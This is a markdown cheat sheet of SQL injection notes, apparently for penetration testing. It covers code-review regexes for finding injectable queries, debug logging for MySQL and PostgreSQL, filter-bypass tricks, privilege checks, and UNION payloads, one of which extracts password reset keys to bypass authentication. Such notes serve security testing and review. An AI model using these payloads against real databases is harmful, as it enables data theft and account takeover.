# SQL Injection tips


## Code Review Regex
```sql
^.*?query.*?select.*?

egrep "^.*?query.*?select.*?" $i
for i in $(cat doGet.txt); do echo $i && egrep "^.*?query.*?select.*?" $i; done

egrep "^.*?\"select.*?" $i
for i in $(cat doGet.txt); do echo $i && egrep "^.*?\"select.*?" $i; done

egrep  "^.*?request\.getParameter\(\"" $i
for i in $(cat doGet.txt); do if egrep -q "^.*?\"select.*?" $i; then if egrep -q "^.*?request\.getParameter\(\"" $i; then echo $i;fi  ;fi; done

# Improved regex
^.*?['"]SELECT.*?['"]\ ?[\+\.]
^.*?['"]UPDATE.*?SET.*?['"]\ ?[\+\.]
^.*?['"]INSERT INTO.*?['"]\ ?[\+\.]

# Targeted/Group Matching
perl -lne 'print $1 if /<REGEX>/' < * 
```

## MySQL
* Turn on debug
    * Edit mysql config file
        ```
        sudo nano /etc/mysql/my.cnf
        ```
    * Uncomment or modify these settings into these values
        ```sql
        general_log_file = /var/log/mysql/mysql.log
        general_log = 1
        ```
    * Restart services
        ```
        sudo systemctl restart mysql
        ```
    * Tail the logs
        ```
        sudo tail –f /var/log/mysql/mysql.log
        ```
* Alternatives / Bypass
    ```sql
    space is /**/
    Comment is #
    ```
* Check current DB Version
    ```sql
    select version();
    @@version;
    ```
* Show current User
    ```sql
    select user();
    # or
    select current_user();
    ```
* Boolean Example
    ```sql
    SELECT count(*) FROM <table> where <column_name> LIKE <QUERY>
    ```
* Show if current user is a database admin (DBA)
    ```sql
    SELECT false OR (select count(user) from mysql.user where (INSTR((select user()), user)  and  super_priv = 'Y' and host = 'localhost')) = 1; # Boolean
    SELECT user from mysql.user where (user = substring_index((select user()),'@',1) and super_priv = 'Y' and host = 'localhost'); # Better
    SELECT false OR (select count(user) from mysql.user where (user = substring_index((select user()),'@',1) and super_priv = 'Y' and host = 'localhost'))=1; # Boolean
    ```
* Payloads
    * Union
        ```
        " UNION ALL SELECT 1,2,3,4,5#   #<-- Depending on number of rows, start from 1 and increase
        " test_value" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#   
        ```
* Limitations
    * Python
        * PyMysql only allows 1 query execution unless parameter `multi=True` is set

* Collations
    * Determine Collation
        * From MySQL cli
            ```sql
            SELECT COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "powertableTop" AND COLUMN_NAME = "name";
            ```
        * Once collation is known, append to 'column name' after `SELECT`
            ```sql
            SELECT name COLLATE utf8mb4_general_ci FROM someTable; #ci means case-insensitive
            SELECT name COLLATE utf8mb4_general_ci, reset_password_key COLLATE utf8mb4_general_ci FROM someTable;
            "test_value" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM someTable;
            ```
* Associated Use cases:
    * Bypass authentication using Password reset by finding authentication token



---
## PostgreSQL
* Enable Debug
    * Edit `postgresql.conf` and change `log_statement` to `all`
        ```
        log_statement = 'all' # none, ddl, mod, all
        ```
* Helpful URLs:
    * OnSecurity[^1]
    * Pulse Security[^2]

* Tail a log file in Windows
    ```powershell
    Get-Content “C:\temp\pgsql_log\*” -Tail 10 -Wait | Select-String -Pattern "SOMEWEIRDTABLE" -Context 0,3
    ```
* Sleep
    ```sql
    pg_sleep(10);
    ```
* Bypass Character Restriction
    * `CHR` and String Concatenation. Only works in `SELECT`,`INSERT`, `DELETE` queries
        ```sql
        SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
        ```
    * Quote can be replaced by `$$`
        ```sql
        SELECT 'TESTVALUE';
        SELECT $$TESTVALUE$$;
        SELECT $TAG$TESTVALUE$TAG$;
        ```
* Check if the current user is a superuser (DBA)
    ```sql
    SELECT current_setting('is_superuser');
    ```
* Create table
    ```sql
    CREATE TEMP TABLE SOMETABLE(columnbus123 text);
    ```
* Insert Values
    ```sql
    INSERT INTO SOMETABLE(columnbus123) VALUES ($$test$$);
* Drop/delete table
    ```sql
    DROP table SOMETABLE;
    ```




















[^1]: [OnSecurity](https://www.onsecurity.io/blog/pentesting-postgresql-with-sql-injections/)
[^2]: [Pulse Security](https://pulsesecurity.co.nz/articles/postgres-sqli)
